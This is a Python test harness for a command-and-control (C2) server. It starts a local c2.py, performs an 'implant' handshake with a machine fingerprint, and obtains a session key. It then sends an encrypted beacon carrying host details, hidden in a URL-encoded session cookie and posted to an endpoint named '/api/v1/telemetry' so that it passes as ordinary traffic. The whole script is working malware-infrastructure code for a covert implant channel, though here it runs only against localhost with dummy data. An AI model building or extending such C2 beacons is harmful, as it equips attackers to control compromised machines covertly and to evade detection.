#!/usr/bin/env python3
import requests
import json
import hashlib
import base64
from cryptography.fernet import Fernet
import time
import subprocess
import urllib.parse

print("=== FIXED BEACON TEST (with URL encoding) ===")

# Start C2
c2 = subprocess.Popen(['python3', 'c2.py'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
time.sleep(3)

try:
    # 1. Handshake
    fingerprint = "527c0c57d2fc4447bd0135ee7bcf6a096841ec650c70a8cebb72c4b392aa1d73"
    implant_id_hash = hashlib.md5(fingerprint.encode()).hexdigest()[:8]
    
    handshake_data = {
        "fingerprint": fingerprint,
        "machine_id": fingerprint,
        "implant_id_hash": implant_id_hash,
        "platform": "linux",
        "arch": "x64"
    }
    
    print(f"[1] Handshake...")
    response = requests.post('http://localhost:4444/handshake', json=handshake_data, timeout=5)
    print(f"   Status: {response.status_code}")
    
    if response.status_code != 200:
        print(f"❌ Handshake failed: {response.text}")
        exit(1)
    
    result = response.json()
    session_key_b64 = result.get('key')
    print(f"✅ Got session key")
    
    # 2. Prepare beacon data
    beacon_data = {
        'id': implant_id_hash,
        'ts': int(time.time()),
        'sys': {'hostname': 'test'},
        'target': 'python3'
    }
    
    # 3. Encrypt with Fernet
    f = Fernet(session_key_b64.encode())
    encrypted = f.encrypt(json.dumps(beacon_data).encode())
    
    # 4. Base64 encode AND URL encode!
    encoded_data = base64.b64encode(encrypted).decode()
    url_encoded_data = urllib.parse.quote(encoded_data)
    
    print(f"[2] Original base64: {encoded_data[:30]}...")
    print(f"   URL encoded: {url_encoded_data[:30]}...")
    
    # 5. Send with URL-encoded cookie
    cookies = {'session': url_encoded_data}
    headers = {'Authorization': f'Bearer {implant_id_hash}'}
    
    print(f"[3] Sending beacon with URL-encoded cookie...")
    
    response = requests.post(
        'http://localhost:4444/api/v1/telemetry',
        cookies=cookies,
        headers=headers,
        timeout=5
    )
    
    print(f"\n[4] Beacon response:")
    print(f"   Status: {response.status_code}")
    print(f"   Response: {response.text}")
    
    if response.status_code == 200:
        print("🎉 ✅ BEACON SUCCESS!")
    else:
        print("❌ Beacon failed")
    
finally:
    print("\n[5] Cleaning up...")
    c2.terminate()
    c2.wait()

print("\n=== TEST COMPLETE ===")
